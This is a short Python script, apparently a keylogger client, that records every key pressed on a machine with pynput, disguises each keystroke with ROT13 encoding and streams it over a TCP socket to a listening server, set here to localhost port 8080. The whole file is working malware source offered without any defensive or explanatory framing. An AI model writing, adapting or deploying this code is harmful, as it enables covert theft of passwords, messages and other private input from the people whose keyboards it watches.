import codecs
from pynput.keyboard import Listener
import socket


class Client:
    def __init__(self, ip, port):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((ip, port))

    def on_press(self, key):  # send the pressed key
        if str(key) != "":
            encoded_key = codecs.encode(str(key).replace("'", ""), "rot_13").encode()
        self.socket.send(encoded_key)

    def start(self):  # start listening to client's keyboard
        with Listener(on_press=self.on_press) as listener:
            listener.join()


if __name__ == "__main__":
    ip = "localhost"
    port = 8080
    client = Client(ip, port)
    client.start()
